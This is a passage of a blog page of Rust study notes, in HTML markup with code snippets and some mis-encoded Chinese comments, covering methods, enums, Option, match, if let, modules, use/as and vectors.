&#125;;</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">"rect1 is &#123;:?&#125;"</span>, rect1);  //or&#123;:<span class="comment">#?&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="method"><a href="#method" class="headerlink" title="method"></a>method</h3><p>their first parameter is <code>always self,</code>which represents the instance of the struct the method is being called on.</p><p>impl (implementation)</p><p>Methods can<code>take ownership of self,</code> borrow<code>self immutably</code>as weâ€™ve done here, or borrow self mutably, just as they can any other parameter.<br><code>&amp;mut self</code></p><h3 id="associated-function"><a href="#associated-function" class="headerlink" title="associated function"></a>associated function</h3><p>Youâ€™ve already used the String::from associated function.</p><p>Associated functions are often used for constructors that will <code>return a new instance of the struct.</code><br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[derive(Debug)]</span><br><span class="line">struct Rectangle &#123;</span><br><span class="line">    width: u32,</span><br><span class="line">    height: u32,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Rectangle &#123;</span><br><span class="line">    fn square(size: u32) -&gt; Rectangle &#123;  //æ²¡æœ‰self</span><br><span class="line">        Rectangle &#123;</span><br><span class="line">            width: size,</span><br><span class="line">            height: size,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let sq = Rectangle::square(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Each struct is allowed to have multiple impl blocks. </p><h3 id="Enum"><a href="#Enum" class="headerlink" title="Enum"></a>Enum</h3><p>æšä¸¾<br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">enum IpAddrKind &#123;</span><br><span class="line">    V4,  //V4 V6å°±æ˜¯æ‰€è°“çš„å˜ä½“</span><br><span class="line">    V6,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let four = IpAddrKind::V4;</span><br><span class="line">    let six = IpAddrKind::V6;</span><br><span class="line"></span><br><span class="line">    route(IpAddrKind::V4);</span><br><span class="line">    route(IpAddrKind::V6);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn route(ip_kind: IpAddrKind) &#123;&#125;</span><br></pre></td></tr></table></figure></p><p>æšä¸¾æ¯”structæ›´ç®€æ˜<br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    enum IpAddr &#123;</span><br><span class="line">        V4(String),</span><br><span class="line">        V6(String),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let home = IpAddr::V4(String::from(<span class="string">"127.0.0.1"</span>));</span><br><span class="line"></span><br><span class="line">    let loopback = IpAddr::V6(String::from(<span class="string">"::1"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æšä¸¾æ¯ä¸ªå˜ä½“å¯ä»¥æœ‰ä¸åŒçš„ç±»å‹<br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    enum IpAddr &#123;</span><br><span class="line">        V4(u8, u8, u8, u8),</span><br><span class="line">        V6(String),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let home = IpAddr::V4(<span class="number">127</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    let loopback = IpAddr::V6(String::from(<span class="string">"::1"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">[allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">struct Ipv4Addr &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct Ipv6Addr &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enum IpAddr &#123;</span><br><span class="line">    V4(Ipv4Addr),</span><br><span class="line">    V6(Ipv6Addr),</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enum Message &#123;</span><br><span class="line">    Quit,</span><br><span class="line">    Move &#123; x: i32, y: i32 &#125;,</span><br><span class="line">    Write(String),</span><br><span class="line">    ChangeColor(i32, i32, i32),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    enum Message &#123;</span><br><span class="line">        Quit,</span><br><span class="line">        Move &#123; x: i32, y: i32 &#125;,</span><br><span class="line">        Write(String),</span><br><span class="line">        ChangeColor(i32, i32, i32),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    impl Message &#123;</span><br><span class="line">        fn call(&amp;self) &#123;</span><br><span class="line">            // method body would be defined here</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let m = Message::Write(String::from(<span class="string">"hello"</span>));</span><br><span class="line">    m.call();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="enum-option"><a href="#enum-option" class="headerlink" title="enum option"></a>enum option</h3><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">![allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">enum Option&lt;<span class="literal">T</span>&gt; &#123; //&lt;<span class="literal">T</span>&gt; means the Some variant of the Option enum can hold one piece of data of any type</span><br><span class="line">    Some(<span class="literal">T</span>),</span><br><span class="line">    None,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>optionä¸ç”¨æ˜¾ç¤ºå¼•å…¥ï¼Œå·²ç»æå‰æœ‰äº†</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let some_number = Some(<span class="number">5</span>);</span><br><span class="line">    let some_string = Some(<span class="string">"a string"</span>);</span><br><span class="line"></span><br><span class="line">    let absent_number: Option&lt;i32&gt; = None;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>If we use None rather than Some, we need to tell Rust what<code>type of Option&lt;T&gt;</code> we have<br>Option<t> and T (where T can be any type) are different types,<br>In other words, you have to convert an Option<t> to a <code>T</code> before you can perform T operations with it. </t></t></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">match</span><br><span class="line">enum Coin &#123;</span><br><span class="line">    Penny,</span><br><span class="line">    Nickel,</span><br><span class="line">    Dime,</span><br><span class="line">    Quarter,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn value_in_cents(coin: Coin) -&gt; u8 &#123;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Penny =&gt; <span class="number">1</span>,</span><br><span class="line">        Coin::Nickel =&gt; <span class="number">5</span>,</span><br><span class="line">        Coin::Dime =&gt; <span class="number">10</span>,</span><br><span class="line">        Coin::Quarter =&gt; <span class="number">25</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br></pre></td></tr></table></figure><p>The code associated with <code>each arm is an expression</code>, and the resulting value of the expression in the matching arm is the value that gets returned for the entire match expression.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn value_in_cents(coin: Coin) -&gt; u8 &#123;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Penny =&gt; &#123;</span><br><span class="line">            println!(<span class="string">"Lucky penny!"</span>);</span><br><span class="line">            <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        Coin::Nickel =&gt; <span class="number">5</span>,</span><br><span class="line">        Coin::Dime =&gt; <span class="number">10</span>,</span><br><span class="line">        Coin::Quarter =&gt; <span class="number">25</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[derive(Debug)]</span><br><span class="line">enum UsState &#123;</span><br><span class="line">    Alabama,</span><br><span class="line">    Alaska,</span><br><span class="line">    // --snip--</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enum Coin &#123;</span><br><span class="line">    Penny,</span><br><span class="line">    Nickel,</span><br><span class="line">    Dime,</span><br><span class="line">    Quarter(UsState),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn value_in_cents(coin: Coin) -&gt; u8 &#123;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Penny =&gt; <span class="number">1</span>,</span><br><span class="line">        Coin::Nickel =&gt; <span class="number">5</span>,</span><br><span class="line">        Coin::Dime =&gt; <span class="number">10</span>,</span><br><span class="line">        Coin::Quarter(state) =&gt; &#123;</span><br><span class="line">            println!(<span class="string">"State quarter from &#123;:?&#125;!"</span>, state); //å¾—åˆ°coiné‡Œquarteré‡Œçš„usstateå€¼</span><br><span class="line">            <span class="number">25</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    value_in_cents(Coin::Quarter(UsState::Alaska));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨option<t><br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    fn plus_one(x: Option&lt;i32&gt;) -&gt; Option&lt;i32&gt; &#123;</span><br><span class="line">        match x &#123;</span><br><span class="line">            None =&gt; None,</span><br><span class="line">            Some(i) =&gt; Some(i + <span class="number">1</span>),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let five = Some(<span class="number">5</span>);</span><br><span class="line">    let six = plus_one(five);</span><br><span class="line">    let none = plus_one(None);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></t></p><p><code>Combining match and enums</code> is useful in many situations.<br>match against an enum, <code>bind a variable to the data inside,</code> and then execute code based on it.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let some_u8_value = 0u8;</span><br><span class="line">    match some_u8_value &#123;</span><br><span class="line">        <span class="number">1</span> =&gt; println!(<span class="string">"one"</span>),</span><br><span class="line">        <span class="number">3</span> =&gt; println!(<span class="string">"three"</span>),</span><br><span class="line">        <span class="number">5</span> =&gt; println!(<span class="string">"five"</span>),</span><br><span class="line">        <span class="number">7</span> =&gt; println!(<span class="string">"seven"</span>),</span><br><span class="line">        _ =&gt; (),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_</code>çœç•¥The _ pattern will match any value.<code>The () is just the unit value</code></p><h3 id="if-let"><a href="#if-let" class="headerlink" title="if let"></a>if let</h3><p>care about only one of the cases. For this situation, Rust provides if let.<br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let some_u8_value = Some(0u8);</span><br><span class="line">    <span class="keyword">if</span> let Some(<span class="number">3</span>) = some_u8_value &#123;</span><br><span class="line">        println!(<span class="string">"three"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let coin = Coin::Penny;</span><br><span class="line">    let mut count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> let Coin::Quarter(state) = coin &#123;</span><br><span class="line">        println!(<span class="string">"State quarter from &#123;:?&#125;!"</span>, state);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        count += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let coin = Coin::Penny;</span><br><span class="line">    let mut count = <span class="number">0</span>;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Quarter(state) =&gt; println!(<span class="string">"State quarter from &#123;:?&#125;!"</span>, state),</span><br><span class="line">        _ =&gt; count += <span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="packages-gt-crates-gt-modules"><a href="#packages-gt-crates-gt-modules" class="headerlink" title="packages&gt;crates&gt;modules"></a>packages&gt;crates&gt;modules</h3><p> A package is<code>one or more crates</code>that provide a set of functionality. A package contains a Cargo.toml file that describes how to build those crates.<br>A package must contain zero or one library crates, and no more. It can contain as many binary crates as youâ€™d like, but it must <code>contain at least one crate</code> (either library or binary).<br>If a package <code>contains src/main.rs and src/lib.rs, it has two crates: a library and a binary,</code> both with the same name as the package.<br>A package can<code>have multiple binary crates by placing files in the src/bin directory:</code>each file will be a separate binary crate.</p><p>the <code>use</code> keyword that brings a path into scope; and the <code>pub</code> keyword to make items public. Weâ€™ll also discuss the as keyword, external packages, and the glob operator</p><p>Modules let us organize code within a crate into groups</p><p>Create a new library named restaurant by running <code>cargo new --lib</code>restaurant;<br>crate //implicit module  src/main.rs and src/lib.rs äº§ç”Ÿ<br> â””â”€â”€ front_of_house<br>     â”œâ”€â”€ hosting<br>     â”‚   â”œâ”€â”€ add_to_waitlist<br>     â”‚   â””â”€â”€ seat_at_table<br>     â””â”€â”€ serving<br>         â”œâ”€â”€ take_order<br>         â”œâ”€â”€ serve_order<br>         â””â”€â”€ take_payment</p><p> If we want to call a function, we need to know its path.<br>A path can take two forms:</p><p>An <code>absolute path</code> starts from a crate root by using a crate name or a literal crate.<br>A <code>relative path</code>starts from the current module and uses self, super, or an identifier in the current module.<br>Both absolute and relative paths are followed by one or more identifiers separated by double colons (<code>::</code>).</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mod front_of_house &#123;</span><br><span class="line">    mod hosting &#123;</span><br><span class="line">        fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    // Absolute path</span><br><span class="line">    crate::front_of_house::hosting::add_to_waitlist();</span><br><span class="line"></span><br><span class="line">    // Relative path</span><br><span class="line">    front_of_house::hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The way privacy works in Rust is that all items (<code>functions, methods, structs, enums, modules, and constants) are private by default</code>.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125; //making the module public doesnâ€™t make its contents public. </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    // Absolute path</span><br><span class="line">    crate::front_of_house::hosting::add_to_waitlist();</span><br><span class="line"></span><br><span class="line">    // Relative path</span><br><span class="line">    front_of_house::hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn serve_order() &#123;&#125;</span><br><span class="line"></span><br><span class="line">mod back_of_house &#123;</span><br><span class="line">    fn fix_incorrect_order() &#123;</span><br><span class="line">        cook_order();</span><br><span class="line">        super::serve_order();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fn cook_order() &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> Enums arenâ€™t very useful unless their variants are public; it would be annoying to have to annotate all enum variants with pub in every case, so the <code>default for enum variants is to be public.</code>Structs are often useful without their fields being public, so struct fields follow the general rule of <code>everything being private by default</code> unless annotated with pub.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">use</span><br><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">use crate::front_of_house::hosting;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">use self::front_of_house::hosting;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="as"><a href="#as" class="headerlink" title="as"></a>as</h3><p>Thereâ€™s another solution to the problem of bringing two types of the same name into the same scope with use: after the path, we can specify <code>as and a new local name</code>, or alias, for the type.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">![allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::fmt::Result;</span><br><span class="line">use std::io::Result as IoResult;</span><br><span class="line"></span><br><span class="line">fn function1() -&gt; Result &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">    Ok(())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn function2() -&gt; IoResult&lt;()&gt; &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">    Ok(())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>this technique is called re-exporting because weâ€™re bringing an item into scope but also making that item available for others to bring into their scope<br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub use crate::front_of_house::hosting;  //å…¶ä»–å¯ä»¥ å¦å¤–åˆ›ç«‹ä¸€ä¸ªé“¾æ¥</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::collections::HashMap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>This is an absolute path starting with std, the name of the standard library crate.</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">use rand::Rng;</span><br><span class="line">// --snip--</span><br><span class="line">use std::&#123;cmp::Ordering, io&#125;;</span><br><span class="line">// --snip--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::io::&#123;self, Write&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::collections::*;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> brings all public items </p><p>The <code>mod</code> keyword declares modules, and Rust looks in a file with the same name as the module for the code that goes into that module.</p><h3 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h3><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let v: Vec&lt;i32&gt; = Vec::new();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let v = vec![<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]; //ç±»åˆ«è‡ªå·±æ¨æµ‹</span><br><span class="line">&#125;</span><br><span class="line">fn main() &#123;</span><br><span class="line">    let mut v = Vec::new();</span><br><span class="line"></span><br><span class="line">    v.push(<span class="number">5</span>);</span><br><span class="line">    v.push(<span class="number">6</span>);</span><br><span class="line">    v.push(<span class="number">7</span>);</span><br><span class="line">    v.push(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">fn main() &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        let v = vec![<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">        // do stuff with v</span><br><span class="line">    &#125; // &lt;- v goes out of scope and is freed here</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let v = vec![<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">    let third: &amp;i32 = &amp;v[<span class="number">2</span>];</span><br><span class="line">    println!(<span class="string">"The third element is &#123;&#125;"</span>, third);</span><br><span class="line"></span><br><span class="line">    match v.get(<span class="number">2</span>) &#123; //gives us an Option&lt;&amp;<span 